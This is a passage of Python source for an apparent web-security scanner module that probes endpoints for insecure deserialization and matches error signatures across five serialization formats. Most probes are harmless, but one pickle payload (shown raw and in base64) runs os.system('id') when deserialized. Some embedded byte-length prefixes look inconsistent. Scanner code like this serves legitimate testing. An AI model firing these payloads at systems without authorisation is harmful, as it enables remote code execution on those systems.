"""
Insecure Deserialization Validation Collector for ARGUS.

Actively validates discovered endpoints, parameters, cookies, and headers for unsafe
deserialization vulnerabilities across multiple serialization formats:
1. Java Deserialization (ObjectInputStream, aced0005, rO0AB markers, ClassNotFoundException)
2. Python Pickle (pickle.loads, gASV markers, UnpicklingError, invalid load key)
3. PHP Serialize (unserialize, O:4 markers, offset error signatures)
4. Ruby Marshal (Marshal.load, \\x04\\x08 / BAh markers, incompatible marshal format)
5. .NET ViewState / BinaryFormatter (ViewState / BinaryFormatter markers, SerializationException)

Supports 5+ distinct payload mutation strategies:
1. Base64 & Double Base64 encoding
2. Gzip compression + Base64 wrapping
3. Hex encoding (raw and escaped)
4. Single & Double URL encoding
5. Content-Type manipulation (application/x-java-serialized-object, application/x-python-pickle, etc.)

Emits structured Evidence(category="deserialization"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import base64
import gzip
import json
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.collectors.toolkit.enums import Severity
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# Severity is imported from argus.collectors.toolkit.enums (see imports).


class DeserializationFormat(str, Enum):
    """Enumeration of supported serialization formats."""
    JAVA = "java"
    PYTHON_PICKLE = "python_pickle"
    PHP_SERIALIZE = "php_serialize"
    RUBY_MARSHAL = "ruby_marshal"
    DOTNET_VIEWSTATE = "dotnet_viewstate"
    DOTNET_BINARY_FORMATTER = "dotnet_binary_formatter"


class DeserializationTechnique(str, Enum):
    """Enumeration of deserialization detection techniques."""
    OBJECT_INPUT_STREAM = "object_input_stream"
    PICKLE_LOADS = "pickle_loads"
    PHP_UNSERIALIZE = "php_unserialize"
    RUBY_MARSHAL_LOAD = "ruby_marshal_load"
    DOTNET_VIEWSTATE = "dotnet_viewstate"
    DOTNET_BINARY_FORMATTER = "dotnet_binary_formatter"


class DeserializationMutationStrategy(str, Enum):
    """Enumeration of payload mutation / bypass strategies."""
    BASE64 = "base64"
    DOUBLE_BASE64 = "double_base64"
    GZIP_BASE64 = "gzip_base64"
    HEX = "hex"
    URL_ENCODE = "url_encode"
    CONTENT_TYPE_MANIPULATION = "content_type_manipulation"


@dataclass
class DeserializationResult:
    """Represents the parsed outcome of a deserialization probe."""
    format: str
    technique: str
    mutation_strategy: str
    severity: str
    confidence: float
    payload: str
    matched_signature: str
    evidence_snippet: str
    parameter: Optional[str] = None
    parameter_type: str = "body"
    status_code: int = 200
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    is_valid_finding: bool = True
    error_message: Optional[str] = None
    template_id: str = "deserialization"


# Detection Signatures Catalogs
JAVA_DESERIALIZATION_SIGNATURES: Dict[str, re.Pattern] = {
    "class_not_found": re.compile(
        r"(?:java\.lang\.ClassNotFoundException|ClassNotFoundException:)",
        re.IGNORECASE,
    ),
    "invalid_class": re.compile(
        r"(?:java\.io\.InvalidClassException|InvalidClassException:)",
        re.IGNORECASE,
    ),
    "stream_corrupted": re.compile(
        r"(?:java\.io\.StreamCorruptedException|StreamCorruptedException:.*invalid stream header)",
        re.IGNORECASE,
    ),
    "optional_data": re.compile(
        r"(?:java\.io\.OptionalDataException|OptionalDataException:)",
        re.IGNORECASE,
    ),
    "object_stream": re.compile(
        r"(?:java\.io\.ObjectStreamException|ObjectStreamException:)",
        re.IGNORECASE,
    ),
    "object_input_stream_trace": re.compile(
        r"java\.io\.ObjectInputStream\.(?:readObject|readClassDesc|readOrdinaryObject|readFatalException)",
        re.IGNORECASE,
    ),
    "serializable_resolution": re.compile(
        r"(?:cannot deserialize instance of|failed to resolve class.*Serializable|NotSerializableException)",
        re.IGNORECASE,
    ),
}

PYTHON_PICKLE_SIGNATURES: Dict[str, re.Pattern] = {
    "unpickling_error": re.compile(
        r"(?:_pickle\.UnpicklingError|UnpicklingError:)",
        re.IGNORECASE,
    ),
    "invalid_load_key": re.compile(
        r"(?:invalid load key,?\s*['\"].*?['\"]|UnpicklingError: invalid load key)",
        re.IGNORECASE,
    ),
    "pickle_data_truncated": re.compile(
        r"pickle data was truncated",
        re.IGNORECASE,
    ),
    "pickle_type_error": re.compile(
        r"(?:TypeError: a bytes-like object is required, not 'str'|TypeError: file must have 'read' and 'readline' attributes)",
        re.IGNORECASE,
    ),
    "pickle_loads_trace": re.compile(
        r"(?:_pickle\.loads|pickle\.loads|cPickle\.loads)",
        re.IGNORECASE,
    ),
    "stack_global_error": re.compile(
        r"(?:STACK_GLOBAL requires str|pickle stack underflow)",
        re.IGNORECASE,
    ),
}

PHP_UNSERIALIZE_SIGNATURES: Dict[str, re.Pattern] = {
    "unserialize_offset_error": re.compile(
        r"unserialize\(\):\s*Error at offset \d+ of \d+ bytes",
        re.IGNORECASE,
    ),
    "unserialize_node_error": re.compile(
        r"unserialize\(\):\s*Node no longer exists",
        re.IGNORECASE,
    ),
    "php_notice_unserialize": re.compile(
        r"PHP Notice:\s*unserialize\(\)",
        re.IGNORECASE,
    ),
    "php_warning_unserialize": re.compile(
        r"PHP Warning:\s*unserialize\(\)",
        re.IGNORECASE,
    ),
    "php_error_unserialize": re.compile(
        r"PHP (?:Fatal error|Error):\s*unserialize\(\)",
        re.IGNORECASE,
    ),
    "unserialize_end_data": re.compile(
        r"unserialize\(\):\s*Unexpected end of serialized data",
        re.IGNORECASE,
    ),
    "could_not_unserialize": re.compile(
        r"(?:The object could not be unserialized|unserialize\(\) expects parameter 1 to be string)",
        re.IGNORECASE,
    ),
}

RUBY_MARSHAL_SIGNATURES: Dict[str, re.Pattern] = {
    "incompatible_marshal_format": re.compile(
        r"(?:TypeError:\s*incompatible marshal file format|incompatible marshal file format \(can't be read\))",
        re.IGNORECASE,
    ),
    "marshal_data_too_short": re.compile(
        r"ArgumentError:\s*marshal data too short",
        re.IGNORECASE,
    ),
    "dump_format_error": re.compile(
        r"(?:TypeError|ArgumentError|RuntimeError):\s*dump format error",
        re.IGNORECASE,
    ),
    "undefined_class_module": re.compile(
        r"ArgumentError:\s*undefined class/module",
        re.IGNORECASE,
    ),
    "marshal_load_trace": re.compile(
        r"(?:in `(?:load|restore)'|Marshal\.(?:load|restore))",
        re.IGNORECASE,
    ),
}

DOTNET_DESERIALIZATION_SIGNATURES: Dict[str, re.Pattern] = {
    "serialization_exception": re.compile(
        r"System\.Runtime\.Serialization\.SerializationException",
        re.IGNORECASE,
    ),
    "binary_format_error": re.compile(
        r"The input stream is not a valid binary format\. The starting contents \(in bytes\) are",
        re.IGNORECASE,
    ),
    "viewstate_exception": re.compile(
        r"System\.Web\.UI\.ViewStateException",
        re.IGNORECASE,
    ),
    "invalid_viewstate": re.compile(
        r"(?:Invalid viewstate|The client resolved a viewstate.*is invalid|The viewstate supplied is invalid)",
        re.IGNORECASE,
    ),
    "json_typename_exception": re.compile(
        r"(?:JsonSerializationException:.*Type specified in \$type|Newtonsoft\.Json\.JsonSerializationException)",
        re.IGNORECASE,
    ),
    "binary_formatter_trace": re.compile(
        r"System\.Runtime\.Serialization\.Formatters\.Binary\.BinaryFormatter\.Deserialize",
        re.IGNORECASE,
    ),
}


class DeserializationPayloadGenerator:
    """
    Generates structured Insecure Deserialization validation probes across
    Java, Python pickle, PHP serialize, Ruby Marshal, and .NET ViewState/BinaryFormatter,
    with 5+ distinct encoding mutation and bypass strategies.
    """

    # Java base serialized stream (magic header \xac\xed\x00\x05 and safe non-existent class probe)
    # Binary: ac ed 00 05 73 72 00 1a 6f 72 67 2e 61 72 67 75 73 2e 73 65 63 75 72 69 74 79 2e 50 72 6f 62 65 4f 62 6a 65 63 74 00 00 00 00 00 00 00 01 02 00 00 78 70
    JAVA_RAW_BYTES = b"\xac\xed\x00\x05sr\x00\x1aorg.argus.security.ProbeObject\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xp"
    JAVA_BASE64 = "rO0ABXNyABpvcmcuYXJndXMuc2VjdXJpdHkuUHJvYmVPYmplY3QAAAAAAAAAAQIAAHhw"

    # Python pickle base payloads
    PYTHON_PICKLE_RAW = b"cos\nsystem\n(S'id'\ntR."
    PYTHON_PICKLE_BASE64 = "Y29zCnN5c3RlbQooUydpZCcKdFIu"
    PYTHON_PICKLE_PROTO4_RAW = b"\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x0bProbeObject\x94\x93\x94)\x81\x94."
    PYTHON_PICKLE_PROTO4_BASE64 = "gASVHgAAAAAAAACMCF9fbWFpbl9flIwaUHJvYmVPYmplY3SUk5QpgVQu"

    # PHP serialize base payloads
    PHP_SERIALIZE_PROBE = 'O:24:"Argus_Probe_NonExistent":1:{s:4:"test";s:4:"data";}'
    PHP_SERIALIZE_MALFORMED = 'O:4:"User":2:{s:4:"name";s:5:"admin";}'

    # Ruby Marshal base payloads
    RUBY_MARSHAL_RAW = b"\x04\x08o:\x1fArgus::Probe::NonExistent\x00"
    RUBY_MARSHAL_BASE64 = "BAhvOh9Bcmd1czo6UHJvYmU6Ok5vbkV4aXN0ZW50AA=="

    # .NET ViewState & BinaryFormatter base payloads
    DOTNET_BF_RAW = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x0c\x02\x00\x00\x00\x1cArgus.Probe.NonExistentClass\x00\x00\x00\x00"
    DOTNET_BF_BASE64 = "AAEAAAD/////AQAAAAAAAAAMAgAAABxBcmd1cy5Qcm9iZS5Ob25FeGlzdGVudENsYXNzAAAA"
    DOTNET_VIEWSTATE_BASE64 = "/wEPDwULLTEyMzQ1Njc4OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNr"

    def generate_baseline_payload(self) -> str:
        """Generates a clean baseline text string."""
        return "argus_benign_baseline_probe_value"

    def mutate_base64(self, raw_bytes: bytes) -> Tuple[str, str]:
        """Generates standard Base64 and double Base64 strings."""
        b64_single = base64.b64encode(raw_bytes).decode("ascii")
        b64_double = base64.b64encode(b64_single.encode("ascii")).decode("ascii")
        return b64_single, b64_double

    def mutate_gzip(self, raw_bytes: bytes) -> str:
        """Gzip compresses bytes and encodes as Base64."""
        gzipped = gzip.compress(raw_bytes)
        return base64.b64encode(gzipped).decode("ascii")

    def mutate_hex(self, raw_bytes: bytes) -> Tuple[str, str]:
        """Generates raw hex (e.g. aced0005...) and escaped hex (e.g. \\xac\\xed\\x00\\x05...)."""
        hex_raw = raw_bytes.hex()
        hex_escaped = "".join(f"\\x{b:02x}" for b in raw_bytes)
        return hex_raw, hex_escaped

    def mutate_url_encoding(self, raw_str: str) -> Tuple[str, str]:
        """Generates single and double URL encodings."""
        url_single = urllib.parse.quote_plus(raw_str)
        url_double = urllib.parse.quote_plus(url_single)
        return url_single, url_double

    def generate_mutated_payloads(
        self,
        target_format: Optional[DeserializationFormat] = None,
        strategy: Optional[DeserializationMutationStrategy] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generates comprehensive mutated payloads covering all formats and 5+ bypass strategies.
        """
        payloads: List[Dict[str, Any]] = []

        # 1. JAVA PAYLOADS
        if target_format is None or target_format == DeserializationFormat.JAVA:
            b64_s, b64_d = self.mutate_base64(self.JAVA_RAW_BYTES)
            gzip_b64 = self.mutate_gzip(self.JAVA_RAW_BYTES)
            hex_raw, hex_esc = self.mutate_hex(self.JAVA_RAW_BYTES)
            url_s, url_d = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": b64_s,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.GZIP_BASE64:
                payloads.append({
                    "payload": gzip_b64,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.GZIP_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_gzip",
                    "content_type": "application/gzip",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.URL_ENCODE:
                payloads.append({
                    "payload": url_s,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_url_encoded",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": url_d,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_double_url",
                    "content_type": "application/x-www-form-urlencoded",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.JAVA_RAW_BYTES.decode("latin1"),
                    "raw_bytes": self.JAVA_RAW_BYTES,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_content_type",
                    "content_type": "application/x-java-serialized-object",
                })

        # 2. PYTHON PICKLE PAYLOADS
        if target_format is None or target_format == DeserializationFormat.PYTHON_PICKLE:
            b64_s, b64_d = self.mutate_base64(self.PYTHON_PICKLE_PROTO4_RAW)
            gzip_b64 = self.mutate_gzip(self.PYTHON_PICKLE_PROTO4_RAW)
            hex_raw, _ = self.mutate_hex(self.PYTHON_PICKLE_PROTO4_RAW)
            url_s, _ = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.PYTHON_PICKLE_PROTO4_BASE64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_proto4",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": self.PYTHON_PICKLE_BASE64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.GZIP_BASE64:
                payloads.append({
                    "payload": gzip_b64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.GZIP_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_gzip",
                    "content_type": "application/gzip",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.PYTHON_PICKLE_PROTO4_RAW.decode("latin1"),
                    "raw_bytes": self.PYTHON_PICKLE_PROTO4_RAW,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_content_type",
                    "content_type": "application/x-python-pickle",
                })

        # 3. PHP SERIALIZE PAYLOADS
        if target_format is None or target_format == DeserializationFormat.PHP_SERIALIZE:
            raw_php_bytes = self.PHP_SERIALIZE_PROBE.encode("utf-8")
            b64_s, _ = self.mutate_base64(raw_php_bytes)
            url_s, url_d = self.mutate_url_encoding(self.PHP_SERIALIZE_PROBE)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.PHP_SERIALIZE_PROBE,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_raw",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": self.PHP_SERIALIZE_MALFORMED,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_malformed",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_s,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.URL_ENCODE:
                payloads.append({
                    "payload": url_s,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_url_encoded",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": url_d,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_double_url",
                    "content_type": "application/x-www-form-urlencoded",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.PHP_SERIALIZE_PROBE,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_content_type",
                    "content_type": "application/x-php-serialized",
                })

        # 4. RUBY MARSHAL PAYLOADS
        if target_format is None or target_format == DeserializationFormat.RUBY_MARSHAL:
            b64_s, b64_d = self.mutate_base64(self.RUBY_MARSHAL_RAW)
            hex_raw, _ = self.mutate_hex(self.RUBY_MARSHAL_RAW)
            url_s, _ = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.RUBY_MARSHAL_BASE64,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.RUBY_MARSHAL_RAW.decode("latin1"),
                    "raw_bytes": self.RUBY_MARSHAL_RAW,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_content_type",
                    "content_type": "application/x-ruby-marshal",
                })

        # 5. .NET VIEWSTATE / BINARYFORMATTER PAYLOADS
        if target_format is None or target_format in (
            DeserializationFormat.DOTNET_VIEWSTATE,
            DeserializationFormat.DOTNET_BINARY_FORMATTER,
        ):
            b64_bf, b64_bf_d = self.mutate_base64(self.DOTNET_BF_RAW)
            hex_bf, _ = self.mutate_hex(self.DOTNET_BF_RAW)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.DOTNET_VIEWSTATE_BASE64,
                    "format": DeserializationFormat.DOTNET_VIEWSTATE.value,
                    "technique": DeserializationTechnique.DOTNET_VIEWSTATE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_dotnet_viewstate",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": self.DOTNET_BF_BASE64,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_binary_formatter",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_bf_d,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_bf_double_b64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_bf,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_bf_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.DOTNET_BF_RAW.decode("latin1"),
                    "raw_bytes": self.DOTNET_BF_RAW,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_content_type",
                    "content_type": "application/octet-stream",
                })

        return payloads


class DeserializationAnalyzer:
    """
    Analyzes HTTP responses for deserialization error signatures,
    performs serialized marker detection, and enforces false positive rejection.
    """

    def detect_serialized_markers(self, data: str) -> List[Tuple[str, str]]:
        """
        Scans parameter values or headers for known serialized data markers.
        Returns a list of (format_name, marker_description) tuples.
        """
        markers = []
        if not data or not isinstance(data, str):
            return markers

        # Java Markers
        if "aced0005" in data.lower() or "\xac\xed\x00\x05" in data or "rO0AB" in data:
            markers.append((DeserializationFormat.JAVA.value, "Java ObjectInputStream Header (aced0005 / rO0AB)"))

        # Python Pickle Markers
        if "gASV" in data or "gAJ" in data or "\x80\x03" in data or "\x80\x04" in data or "\x80\x05" in data or "cos\nsystem" in data:
            markers.append((DeserializationFormat.PYTHON_PICKLE.value, "Python Pickle Stream Marker (gASV / \\x80\\x04)"))

        # PHP Serialize Markers
        if re.search(r'O:\d+:"[^"]+":\d+:{', data) or re.search(r'a:\d+:{', data):
            markers.append((DeserializationFormat.PHP_SERIALIZE.value, "PHP Serialize Object Marker (O:...)"))

        # Ruby Marshal Markers
        if "\x04\x08" in data or data.startswith("BAh") or data.startswith("BAg"):
            markers.append((DeserializationFormat.RUBY_MARSHAL.value, "Ruby Marshal Header (\\x04\\x08 / BAh)"))

        # .NET ViewState / BinaryFormatter Markers
        if data.startswith("/wEPDw") or data.startswith("/wE") or data.startswith("AAEAAAD/////"):
            markers.append((DeserializationFormat.DOTNET_VIEWSTATE.value, ".NET ViewState / BinaryFormatter Marker"))

        return markers

    def analyze_response(
        self,
        response: HttpResponse,
        payload_info: Dict[str, Any],
        baseline_response: Optional[HttpResponse] = None,
        parameter_name: Optional[str] = None,
        parameter_type: str = "body",
    ) -> Optional[DeserializationResult]:
        """
        Analyzes the response body against known deserialization signatures.
        Applies false positive rejection:
        - Rejects verbatim search reflections
        - Rejects baseline error noise (baseline subtraction)
        - Rejects generic 404/500 responses lacking deserialization stack traces
        """
        if response is None:
            return None

        body = getattr(response, "body", "") or getattr(response, "raw_body", "") or ""
        if isinstance(body, bytes):
            body = body.decode("latin1", errors="ignore")
        elif not isinstance(body, str):
            body = str(body)

        payload_str = str(payload_info.get("payload", ""))
        target_fmt = payload_info.get("format", DeserializationFormat.JAVA.value)
        technique = payload_info.get("technique", DeserializationTechnique.OBJECT_INPUT_STREAM.value)
        mutation = payload_info.get("mutation_strategy", DeserializationMutationStrategy.BASE64.value)
        template_id = payload_info.get("template_id", "deserialization")
        expected_severity = payload_info.get("severity", Severity.CRITICAL.value)
        expected_confidence = payload_info.get("confidence", 0.95)

        # Baseline subtraction: if baseline has the exact same body, no finding
        if baseline_response is not None:
            base_body = getattr(baseline_response, "body", "") or getattr(baseline_response, "raw_body", "") or ""
            if isinstance(base_body, bytes):
                base_body = base_body.decode("latin1", errors="ignore")
            if body == base_body:
                return None

        # Check catalogs based on target format
        signature_catalogs: Dict[str, Dict[str, re.Pattern]] = {
            DeserializationFormat.JAVA.value: JAVA_DESERIALIZATION_SIGNATURES,
            DeserializationFormat.PYTHON_PICKLE.value: PYTHON_PICKLE_SIGNATURES,
            DeserializationFormat.PHP_SERIALIZE.value: PHP_UNSERIALIZE_SIGNATURES,
            DeserializationFormat.RUBY_MARSHAL.value: RUBY_MARSHAL_SIGNATURES,
            DeserializationFormat.DOTNET_VIEWSTATE.value: DOTNET_DESERIALIZATION_SIGNATURES,
            DeserializationFormat.DOTNET_BINARY_FORMATTER.value: DOTNET_DESERIALIZATION_SIGNATURES,
        }

        matched_sig_name: Optional[str] = None
        matched_snippet: Optional[str] = None
        matched_format: str = target_fmt

        # First check the target format catalog
        primary_catalog = signature_catalogs.get(target_fmt, JAVA_DESERIALIZATION_SIGNATURES)
        for sig_name, pattern in primary_catalog.items():
            match = pattern.search(body)
            if match:
                matched_sig_name = f"{target_fmt}_{sig_name}"
                start = max(0, match.start() - 40)
                end = min(len(body), match.end() + 100)
                matched_snippet = body[start:end].strip().replace("\r", " ").replace("\n", " ")
                break

        # If not matched in target catalog, scan other catalogs
